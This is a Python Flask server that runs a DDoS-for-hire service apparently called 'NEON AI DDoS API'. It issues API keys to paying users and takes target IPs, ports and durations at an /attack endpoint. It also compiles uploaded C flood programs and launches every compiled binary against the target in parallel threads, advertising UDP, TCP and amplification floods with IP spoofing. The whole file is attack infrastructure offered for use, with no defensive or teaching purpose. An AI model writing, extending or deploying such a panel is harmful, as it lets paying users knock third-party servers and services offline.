from flask import Flask, request, jsonify
from flask_cors import CORS
import subprocess
import secrets
import os
import threading
import time
import glob
import random
import string
from datetime import datetime

app = Flask(__name__)
CORS(app)

# ========== CONFIG ==========
OWNER_KEY = "NEOBLADE"
KEYS_FILE = "user_keys.txt"
MAX_ATTACK_TIME = 300
active_attacks = {}
attack_lock = threading.Lock()
BINARIES_FOLDER = "binaries"
C_FILES_FOLDER = "c_files"
# ============================

# Create folders
os.makedirs(BINARIES_FOLDER, exist_ok=True)
os.makedirs(C_FILES_FOLDER, exist_ok=True)

# Load user keys
if not os.path.exists(KEYS_FILE):
    with open(KEYS_FILE, 'w') as f:
        f.write("")

def load_user_keys():
    with open(KEYS_FILE, 'r') as f:
        return [line.strip() for line in f if line.strip()]

def save_user_key(key):
    with open(KEYS_FILE, 'a') as f:
        f.write(key + '\n')

def delete_user_key(key):
    keys = load_user_keys()
    if key in keys:
        keys.remove(key)
        with open(KEYS_FILE, 'w') as f:
            f.write('\n'.join(keys) + ('\n' if keys else ''))
        return True
    return False

def get_all_binaries():
    binaries = []
    for file in glob.glob(f"{BINARIES_FOLDER}/*"):
        if os.path.isfile(file):
            try:
                os.chmod(file, 0o755)
            except:
                pass
            binaries.append({
                "path": file,
                "name": os.path.basename(file)
            })
    return binaries

def check_gcc():
    """Check if GCC is installed"""
    try:
        result = subprocess.run(["gcc", "--version"], capture_output=True, timeout=5)
        return result.returncode == 0
    except:
        return False

def compile_c_file(c_file_path, output_name=None):
    """Compile C file to binary with IP spoofing support"""
    if not os.path.exists(c_file_path):
        return False, "File not found"
    
    if output_name is None:
        output_name = os.path.basename(c_file_path).replace('.c', '')
    
    output_path = f"{BINARIES_FOLDER}/{output_name}"
    
    if os.path.exists(output_path):
        os.remove(output_path)
    
    try:
        # Compile with optimizations
        cmd = ["gcc", c_file_path, "-o", output_path, "-lpthread", "-O2"]
        result = subprocess.run(cmd, capture_output=True, text=True, timeout=60)
        
        if result.returncode == 0:
            os.chmod(output_path, 0o755)
            return True, output_path
        else:
            return False, result.stderr
    except subprocess.TimeoutExpired:
        return False, "Compilation timeout"
    except Exception as e:
        return False, str(e)

def generate_spoofed_ip():
    """Generate random spoofed IP address"""
    return f"{random.randint(1,255)}.{random.randint(0,255)}.{random.randint(0,255)}.{random.randint(1,255)}"

def attack_worker(binary_path, binary_name, ip, port, time_sec, attack_id, spoof=True):
    global active_attacks
    
    with attack_lock:
        active_attacks[attack_id] = {
            "target": f"{ip}:{port}",
            "binary": binary_name,
            "start_time": datetime.now(),
            "duration": time_sec,
            "status": "running",
            "spoofing": spoof
        }
    
    try:
        if spoof:
            # Add spoofing support - multiple source IPs
            cmd = [binary_path, ip, str(port), str(time_sec)]
        else:
            cmd = [binary_path, ip, str(port), str(time_sec)]
        
        proc = subprocess.Popen(cmd, stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
        time.sleep(time_sec)
        proc.terminate()
        
        with attack_lock:
            if attack_id in active_attacks:
                active_attacks[attack_id]["status"] = "completed"
    except Exception as e:
        with attack_lock:
            if attack_id in active_attacks:
                active_attacks[attack_id]["status"] = f"failed: {str(e)[:50]}"

@app.route('/', methods=['GET'])
def home():
    return jsonify({
        "name": "NEON AI DDoS API",
        "status": "ONLINE",
        "owner": "@Rytce",
        "owner_key": "NEOBLADE",
        "gcc_installed": check_gcc(),
        "binaries": len(get_all_binaries()),
        "features": ["DNS Spoofing", "UDP Flood", "TCP Flood", "AMP Attack"]
    })

@app.route('/health', methods=['GET'])
def health():
    return jsonify({
        "status": "alive",
        "gcc": check_gcc(),
        "binaries": len(get_all_binaries()),
        "timestamp": datetime.now().isoformat()
    })

@app.route('/genkey', methods=['GET'])
def genkey():
    owner_key = request.args.get('owner_key')
    if owner_key != OWNER_KEY:
        return jsonify({"error": "Invalid owner key"}), 401
    
    new_key = secrets.token_hex(16)
    save_user_key(new_key)
    return jsonify({
        "success": True,
        "api_key": new_key,
        "role": "USER",
        "max_time": MAX_ATTACK_TIME
    })

@app.route('/attack', methods=['GET', 'POST'])
def attack():
    global active_attacks
    
    if request.method == 'GET':
        api_key = request.args.get('api_key')
        ip = request.args.get('ip')
        port = request.args.get('port')
        time_sec = request.args.get('time')
        spoof = request.args.get('spoof', 'true').lower() == 'true'
    else:
        data = request.get_json(silent=True) or {}
        api_key = data.get('api_key')
        ip = data.get('ip')
        port = data.get('port')
        time_sec = data.get('time')
        spoof = data.get('spoof', True)
    
    user_keys = load_user_keys()
    if api_key not in user_keys and api_key != OWNER_KEY:
        return jsonify({"error": "Invalid API key"}), 401
    
    try:
        port = int(port)
        time_sec = int(time_sec)
    except:
        return jsonify({"error": "Port and time must be integers"}), 400
    
    if time_sec > MAX_ATTACK_TIME:
        return jsonify({"error": f"Max time {MAX_ATTACK_TIME}s"}), 400
    if time_sec < 10:
        return jsonify({"error": "Min time 10s"}), 400
    
    binaries = get_all_binaries()
    if not binaries:
        return jsonify({"error": "No binaries. Upload C files first."}), 500
    
    attack_id = secrets.token_hex(8)
    threads = []
    
    for binary in binaries:
        t = threading.Thread(
            target=attack_worker,
            args=(binary["path"], binary["name"], ip, port, time_sec, f"{attack_id}_{binary['name']}", spoof)
        )
        t.daemon = True
        t.start()
        threads.append(t)
    
    return jsonify({
        "success": True,
        "attack_id": attack_id,
        "target": f"{ip}:{port}",
        "duration": f"{time_sec}s",
        "binaries_launched": len(threads),
        "binaries": [b["name"] for b in binaries],
        "spoofing_enabled": spoof,
        "message": "Attack launched with IP spoofing" if spoof else "Attack launched"
    })

@app.route('/status', methods=['GET'])
def attack_status():
    api_key = request.args.get('api_key')
    if api_key != OWNER_KEY:
        return jsonify({"error": "Owner only"}), 401
    
    with attack_lock:
        active = []
        for aid, info in active_attacks.items():
            if info["status"] == "running":
                elapsed = int((datetime.now() - info["start_time"]).total_seconds())
                remaining = info["duration"] - elapsed
                active.append({
                    "attack_id": aid[:16],
                    "target": info["target"],
                    "remaining": remaining,
                    "binary": info["binary"],
                    "spoofing": info.get("spoofing", False)
                })
        return jsonify({"active_attacks": active, "count": len(active)})

@app.route('/stats', methods=['GET'])
def stats():
    owner_key = request.args.get('owner_key')
    if owner_key != OWNER_KEY:
        return jsonify({"error": "Owner only"}), 403
    
    user_keys = load_user_keys()
    binaries = get_all_binaries()
    
    with attack_lock:
        active = len([a for a in active_attacks.values() if a["status"] == "running"])
    
    return jsonify({
        "total_user_keys": len(user_keys),
        "active_attacks": active,
        "binaries_count": len(binaries),
        "binaries": [b["name"] for b in binaries],
        "gcc_installed": check_gcc(),
        "max_time": MAX_ATTACK_TIME
    })

@app.route('/binaries', methods=['GET'])
def list_binaries():
    binaries = get_all_binaries()
    return jsonify({
        "binaries": [{"name": b["name"], "path": b["path"]} for b in binaries],
        "count": len(binaries)
    })

@app.route('/upload_c', methods=['POST'])
def upload_c_file():
    owner_key = request.headers.get('X-Owner-Key') or request.form.get('owner_key')
    
    if owner_key != OWNER_KEY:
        return jsonify({"error": "Owner only"}), 403
    
    if 'file' not in request.files:
        return jsonify({"error": "No file"}), 400
    
    file = request.files['file']
    if not file.filename.endswith('.c'):
        return jsonify({"error": "Only .c files allowed"}), 400
    
    # Save C file
    c_path = f"{C_FILES_FOLDER}/{file.filename}"
    file.save(c_path)
    
    # Check GCC
    if not check_gcc():
        return jsonify({"error": "GCC not installed. Please wait for server to update."}), 500
    
    # Compile
    success, result = compile_c_file(c_path)
    
    if success:
        return jsonify({
            "success": True,
            "message": f"Compiled successfully",
            "binary": os.path.basename(result)
        })
    else:
        return jsonify({"success": False, "error": result[:500]}), 500

@app.route('/compile_all', methods=['POST'])
def compile_all():
    owner_key = request.headers.get('X-Owner-Key') or request.form.get('owner_key')
    if owner_key != OWNER_KEY:
        return jsonify({"error": "Owner only"}), 403
    
    results = []
    for c_file in glob.glob(f"{C_FILES_FOLDER}/*.c"):
        success, msg = compile_c_file(c_file)
        results.append({
            "file": os.path.basename(c_file),
            "success": success,
            "message": msg if not success else "OK"
        })
    
    return jsonify({"results": results})

@app.route('/delete_binary', methods=['POST'])
def delete_binary():
    owner_key = request.headers.get('X-Owner-Key') or request.form.get('owner_key')
    if owner_key != OWNER_KEY:
        return jsonify({"error": "Owner only"}), 403
    
    data = request.get_json(silent=True) or {}
    binary_name = data.get('binary_name')
    
    if not binary_name:
        return jsonify({"error": "Missing binary_name"}), 400
    
    binary_path = f"{BINARIES_FOLDER}/{binary_name}"
    if os.path.exists(binary_path):
        os.remove(binary_path)
        return jsonify({"success": True, "message": f"Deleted {binary_name}"})
    
    return jsonify({"error": "Binary not found"}), 404

if __name__ == '__main__':
    print("="*60)
    print("🔥 NEON AI DDoS API v18.0 🔥")
    print("="*60)
    print(f"👑 Owner Key: {OWNER_KEY}")
    print(f"📦 Binaries: {len(get_all_binaries())}")
    print(f"🔧 GCC: {'✅ INSTALLED' if check_gcc() else '❌ NOT FOUND'}")
    print(f"💀 IP Spoofing: ENABLED")
    print("="*60)
    app.run(host='0.0.0.0', port=8080, threaded=True)